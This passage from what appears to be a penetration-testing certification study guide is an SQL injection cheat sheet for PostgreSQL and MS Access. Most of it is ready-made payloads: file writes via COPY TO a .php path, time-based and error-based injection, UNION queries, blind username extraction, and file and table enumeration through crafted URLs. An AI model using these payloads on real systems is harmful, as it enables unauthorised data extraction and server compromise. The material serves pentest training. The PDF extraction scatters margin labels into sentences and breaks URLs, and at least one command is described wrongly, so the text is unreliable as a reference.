+COPY mytable (mycol) TO ‘/tmp/test.php’;
+— priv, write files as postgres OS-level user. Generally, you will not
+be able to write to the web root.
+— priv user can also read/write files by mapping libc functions.
+▪ SELECT inet_server_addr();
+— This command returns db server IP address (or null if using local
+Hostname, IP connection).
+Address ▪ SELECT inet_server_port();
+— This command returns db server IP address (or null if using local
+connection)
+Page | 36 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+Error Based
+▪ cast((chr(95)||current_database()) as numeric);
+SQLi Attack:
+— This command is used to receive integer inputs.
+To throw
+▪ '||cast((chr(95)||current_database()) as numeric)||';
+Conversion
+— This command is used to receive string inputs.
+Errors
+Clear SQLi ▪ product.php?id=4
+Tests: ▪ product.php?id=5-1
+For Boolean ▪ product.php?id=4 OR 1=1
+SQL Injection ▪ product.php?id=-1 OR 17-7=10
+and Silent — These commands can be used as tests for Boolean SQL injection
+Attacks and silent attacks.
+▪ ?vulnerableParam=-1; SELECT CASE WHEN
+(COALESCE(ASCII(SUBSTR(({INJECTION}),1,1)),0) > 100) THEN
+Time Based
+pg_sleep(14) ELSE pg_sleep(0) END LIMIT 1--+;
+SQLi
+{INJECTION} = You want to run the query.
+Exploitation
+— If the condition is true, will response after 14 seconds. If is false,
+will be delayed for one second.
+Default ▪ template0
+Databases ▪ template1
+▪ SELECT current_setting('data_directory');
+— This command returns the path of data_directory (C:/Program
+Path of DB Files/PostgreSQL/8.3/data)
+Files ▪ SELECT current_setting('hba_file');
+— This command returns the path of hba_file (C:/Program
+Files/PostgreSQL/8.3/data/pg_hba.conf)
+▪ SELECT current_setting(‘data_directory’);
+Location of DB — This command returns the location of the data_directory.
+Files ▪ SELECT current_setting(‘hba_file’);
+— This command returns the location of the hba_file.
+▪ SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
+Privileges — This command returns the user names along with their privileges
+from the table ‘pg_user’.
+Find Active ▪ SELECT * FROM pg_locks;
+Locks — Displays information about the active locks in the database.
+▪ SELECT indexname FROM pg_indexes WHERE schemaname =
+List Indexes 'public';
+— Lists all indexes in the public schema.
+Page | 37 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT tgname FROM pg_trigger WHERE NOT tgisinternal;
+List Triggers
+— Lists all the non-internal triggers in the database.
+▪ SELECT pg_size_pretty(pg_database_size(current_database()));
+Current
+— Displays the size of the current database in a human-readable
+Database Size
+format.
+8. MS ACCESS Database
+Query Command
+▪ SELECT Name FROM msysobjects WHERE Type = 1;
+List Tables — This command retrieves column name ‘Name’ from the table
+‘msysobjects’ having type value as ‘1’.
+Create DB This command is used to create database accounts
+Accounts ▪ CREATE USER victor IDENTIFIED BY 'pass123'
+▪ Comment characters are not available in Microsoft Access. However,
+it is possible to remove useless part of a query with the NULL char
+Query
+(%00). A query truncation looks like:
+Comment
+http://localhost/script.asp?id=1’+UNION+SELECT+1,2,3,4+FROM+so
+meValidTabName%00;
+▪ Apache (PHP):
+Fatal error: Uncaught exception 'com_exception' with message
+Syntax Error
+'Source: Microsoft JET Database Engine Description: [...];
+Messages
+▪ IIS (ASP):
+Microsoft JET Database Engine error '80040e14';
+Stacked Query ▪ Stacked queries are not allowed.
+▪ Subqueries are supported by MS Access. In the following
+example, TOP 1 is used to return one row only:
+Sub Query
+http://localhost/script.asp?id=1'+AND+(SELECT+TOP+1+'someData'+
+FROM+table)%00;
+▪ In some cases, it is useful to include in the web application response
+Hardcoded the outcome of our UNION SELECT query only, making the hardcoded
+Query query returning 0 results. A common trick can be used for our
+Returning 0 purpose:
+Rows http://localhost/script.asp?id=1'+AND+1=0+UNION+SELECT+1,2,3+F
+ROM+table%00;
+Page | 38 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ The LIMIT operator is not implemented within MS Access. However, it
+is possible to limit SELECT query results to the first N table rows using
+the TOP operator. TOP accepts as argument an integer, representing
+the number of rows to be returned.
+Limit Support
+http://localhost/script.asp?id=1'+UNION+SELECT+TOP+3+someAttrN
+ame+FROM+validTable%00;
+▪ In the above example, In addition to TOP, the operator LAST can be
+used to fully emulate the behavior of LIMIT.
+▪ http://localhost/script.asp?id=1'+UNION+SELECT+LEN('1234')+FRO
+String Length M+table%00;
+This request above returns 4, the length of the string “1234”.
+▪ http://localhost/script.asp?id=1'+UNION+SELECT+MID('abcd',1,1)+F
+ROM+table%00;
+▪ http://localhost/script.asp?id=1'+UNION+SELECT+MID('abcd',2,1)+F
+ROM+table%00;
+Substring
+— The operator MID can be used to select a portion of a specified
+string
+— The first query returns the character ‘a’, whereas the second query
+returns ‘b’.
+▪ http://localhost/script.asp?id=1'+UNION+SELECT+'web'+%2b+'app'+
+FROM+table%00;
+String ▪ http://localhost/script.asp?id=1'+UNION+SELECT+'web'+%26+'app'+
+Concatenation FROM+table%00;
+— &(%26) and + (%2b) characters are used for string concatenation.
+— Both queries return the string “webapp”.
+▪ IIF(condition, true, false);
+▪ http://localhost/script.asp?id=1'+UNION+SELECT+IIF(1=1,'a','b')+FR
+IF THEN OM+table%00;
+Conditional — The IIF operator can be used to build an “if-then” conditional
+Statement statement. As shown below, the syntax for this function is simple:
+— This command returns the character ‘a’ as the condition 1=1 is
+always true.
+▪ http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeD
+Web Root
+B.FakeTable%00;
+Directory Full
+— Using the above request, MS Access responds with an error
+Path
+message containing the web directory full pathname.
+▪ The CHR operator converts the argument character to its ASCII value:
+Char from http://localhost/script.asp?id=1'+UNION+SELECT+CHR(65)+FROM+t
+ASCII Value able%00;
+— This command returns the character ‘A’.
+Page | 39 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ The ASC operator returns the ASCII value of the character passed as
+argument:
+ASCII Value
+http://localhost/script.asp?id=1'+UNION+SELECT+ASC('A')+FROM+ta
+from Char
+ble%00;
+— This command returns 65, the ASCII value of the character ‘A’.
+▪ Database file name (.mdb) can be inferred with the following query:
+http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].
+.mdb File realTable%00;
+Name — Where name[i] is a .mdb filename and realTable is an existent table
+Guessing within the database. Although MS Access will always trigger an error
+message, it is possible to distinguish between an invalid filename and
+a valid .mdb filename.
+.mdb ▪ Access PassView is a free utility that can be used to recover the main
+Password database password of Microsoft Access 95/97/2000/XP or Jet
+Cracker Database Engine 3.0/4.0
+▪ MS Access supports UNION and UNION ALL operators, although they
+require an existent table name within the FROM clause of
+Union
+the SELECT query. Table brute forcing can be used to obtain a valid
+Operator
+table name. Please refer to last section (Another Bruteforcing
+Technique) of this document.
+▪ http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msy
+sobjects+IN+'\boot.ini'%00;
+— By implementing the above request, if the specified file exists, MS
+Access triggers an error message informing that the database format
+is invalid
+File
+▪ Another way to enumerate files consists into specifying
+Enumeration
+a database.table item
+http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\\boot
+.ini.TableName%00;
+— By implementing the above command, if the specified file exists,
+MS Access displays a database format error message
+Table fields can be enumerated with a simple trick. First of all, it is
+necessary to find a valid table name. If error messages are not
+Table Fields concealed, the name of table is usually included in the error
+Enumeration messages. Let’s assume that id is a valid table name.
+At this stage, we can use a well-known MS SQL server technique to
+enumerate all table fields.
+Page | 40 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ http://localhost/script.asp?id=1'+GROUP+BY+ID%00;
+— As the system will now respond with a slightly different error
+message including another field name, we can proceed with the
+following:
+▪ http://localhost/script.asp?id=1'+GROUP+BY+ID,FIELD2%00;
+— Consequently, this process can be repeated several times until all
+field names have been uncovered. Note that it is not possible to use
+this technique if you are dealing with query like “SELECT * FROM”
+▪ The total number of rows in a table can be discovered with the query:
+Table Rows ▪ http://localhost/script.asp?id=1'+AND+IIF((SELECT+COUNT(*)+FRO
+Counting M+validTableName)=X,1,0)%00;
+— In the following, TAB_LEN is the discovered number of rows.
+▪ Backslash escaped input filtering can be easily bypassed in MS Access.
+Escaping user's inputs by adding backslashes is not enough in order to
+Filters Evasion prevent SQL injection as the character ‘\’ is the integer divide
+operator. A clever example of bypass has been already discussed
+here.
+▪ Using our favorite scripting language, it is possible to iterate on all
+wordlist items using the query:
+http://localhost/script.asp?id=1'+AND+(SELECT+TOP+1+FROM+$wor
+dlist)%00;
+Table and
+— If the $wordlist item exists, the web application should display a
+Field Names
+standard HTML response.
+Brute forcing
+▪ Once obtained a valid table name, we can guess a field name in a
+similar way:
+http://localhost/script.asp?id=1'+AND+(SELECT+TOP+1+FieldName[i
+]+FROM+validTableName)%00;
+▪ Assuming that we have already discovered the vulnerable ‘id’ field,
+the table name and the field name, we can proceed using the
+following query:
+http://localhost/index.asp?id=IIF((select%20mid(last(username),1,1)
+%20&#13;from%20(select%20top%2010%20username%20from%20u
+sers))='a',0,'ko');
+▪ In a nutshell, the query uses an “if-then” statement in order to trigger
+Blind SQL
+a “200 OK” in case of success or a “500 Internal Error” otherwise.
+Injection
+Taking advantage of the TOP 10 operator, it is possible to select the
+first ten results. The subsequent usage of LAST allows to consider the
+10th tuple only.
+▪ On such value, using the MID operator, it is possible to perform a
+simple character comparison.
+▪ Properly changing the index of MID and TOP, we can dump the
+content of the “username” field for all rows.
+Page | 41 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+Page | 42 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
